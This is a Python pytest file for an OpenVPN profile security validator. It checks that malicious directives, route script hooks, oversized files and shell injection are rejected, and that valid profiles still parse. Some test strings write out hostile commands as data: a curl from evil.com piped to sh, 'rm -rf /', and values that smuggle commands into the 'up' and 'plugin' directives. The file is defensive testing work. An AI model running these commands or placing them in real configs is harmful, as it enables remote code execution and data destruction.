import os
import pytest
from pathlib import Path
from opensight.core.ovpn_security import (
    validate_ovpn_security,
    FORBIDDEN_DIRECTIVES,
    ALLOWED_DIRECTIVES,
    ALLOWED_TAG_BLOCKS,
)
from opensight.core.parser import OvpnParser, ParseError, MAX_OVPN_FILE_SIZE_BYTES
from tests.malicious_inputs.sample_ovpn import MALICIOUS_OVPN_CASES, VALID_OVPN_PROFILES


@pytest.mark.parametrize("case_name,ovpn_content", list(MALICIOUS_OVPN_CASES.items()))
def test_malicious_ovpn_directives_rejected_by_validator(case_name, ovpn_content):
    """Ensure all malicious test fixtures are rejected by validate_ovpn_security."""
    is_safe, msg = validate_ovpn_security(ovpn_content, source_name=f"{case_name}.ovpn")
    assert not is_safe, f"Malicious case '{case_name}' should have been rejected, but passed validator"
    assert len(msg) > 0


@pytest.mark.parametrize("case_name,ovpn_content", list(MALICIOUS_OVPN_CASES.items()))
def test_malicious_ovpn_directives_rejected_by_parser(case_name, ovpn_content):
    """Ensure all malicious test fixtures raise ParseError in OvpnParser.parse_text."""
    with pytest.raises(ParseError, match="安全策略拦截"):
        OvpnParser.parse_text(ovpn_content, filename=f"{case_name}.ovpn")


@pytest.mark.parametrize("directive", sorted(list(FORBIDDEN_DIRECTIVES)))
def test_each_forbidden_directive_explicitly_blocked(directive):
    """Test every individual forbidden directive from FORBIDDEN_DIRECTIVES."""
    malicious_text = f"client\nproto udp\nremote 1.2.3.4 1194\n{directive} /path/to/payload\n"
    is_safe, msg = validate_ovpn_security(malicious_text)
    assert not is_safe
    assert directive in msg.lower() or "检测到禁止" in msg


def test_dangerous_route_script_directives():
    """Ensure route-up and route-pre-down script hooks are strictly blocked."""
    route_up = "client\nproto udp\nremote 1.2.3.4 1194\nroute-up /usr/bin/evil_route.sh\n"
    is_safe, msg = validate_ovpn_security(route_up)
    assert not is_safe
    assert "route-up" in msg

    route_pre_down = "client\nproto udp\nremote 1.2.3.4 1194\nroute-pre-down /usr/bin/evil_route.sh\n"
    is_safe, msg = validate_ovpn_security(route_pre_down)
    assert not is_safe
    assert "route-pre-down" in msg


def test_command_like_values_and_shell_metacharacters():
    """Test command-like values, pipe, semicolon, and backtick injection attempts."""
    dangerous_configs = [
        "client\nremote 1.2.3.4 1194\nup `curl http://evil.com/shell | sh`\n",
        "client\nremote 1.2.3.4 1194\ndown $(rm -rf /)\n",
        "client\nremote 1.2.3.4 1194\nscript-security 2\nup calc.exe & echo pwned\n",
        "client\nremote 1.2.3.4 1194\nplugin evil.dll;calc.exe\n",
    ]
    for cfg in dangerous_configs:
        is_safe, msg = validate_ovpn_security(cfg)
        assert not is_safe, f"Dangerous command string should be rejected: {cfg}"


def test_oversized_ovpn_config_rejected(tmp_path: Path):
    """Ensure config files exceeding 2MB are rejected without memory exhaustion."""
    oversized_file = tmp_path / "oversized_payload.ovpn"
    # Create file slightly larger than 2MB
    padding = "client\nproto udp\nremote 1.2.3.4 1194\n" + ("# safe comment padding line\n" * 80000)
    assert len(padding.encode("utf-8")) > MAX_OVPN_FILE_SIZE_BYTES
    oversized_file.write_text(padding, encoding="utf-8")

    with pytest.raises(ParseError, match="文件超出 2MB 大小限制"):
        OvpnParser.parse_file(oversized_file)


def test_invalid_encoding_fallback(tmp_path: Path):
    """Test parsing files with non-UTF8 encodings (GB18030, CP1252, Latin-1, binary header)."""
    enc_file = tmp_path / "chinese_comment.ovpn"
    # Write GB18030 encoded text
    gb_content = "client\nproto tcp\nremote 1.2.3.4 443\n# 日本东京服务器 节点测试\n"
    enc_file.write_bytes(gb_content.encode("gb18030"))

    profile = OvpnParser.parse_file(enc_file)
    assert profile.protocol == "tcp"
    assert len(profile.remotes) == 1
    assert profile.remotes[0].host == "1.2.3.4"


def test_valid_ovpn_profiles_pass_successfully():
    """Ensure standard safe profiles with redirect-gateway, remotes, and certificates parse accurately."""
    for name, content in VALID_OVPN_PROFILES.items():
        is_safe, msg = validate_ovpn_security(content, source_name=f"{name}.ovpn")
        assert is_safe, f"Valid profile '{name}' was unexpectedly rejected: {msg}"

        profile = OvpnParser.parse_text(content, filename=f"{name}.ovpn")
        assert profile.server_name is not None
        assert len(profile.remotes) > 0


def test_redirect_gateway_and_dns_blocks_are_permitted():
    """Verify standard client network directives like redirect-gateway and block-outside-dns are allowed."""
    content = """
client
proto udp
remote jp.protonvpn.net 1194
redirect-gateway def1
block-outside-dns
block-ipv6
resolv-retry infinite
"""
    is_safe, msg = validate_ovpn_security(content)
    assert is_safe, f"Safe client directives should be allowed: {msg}"
    profile = OvpnParser.parse_text(content, filename="jp_test.ovpn")
    assert profile.protocol == "udp"
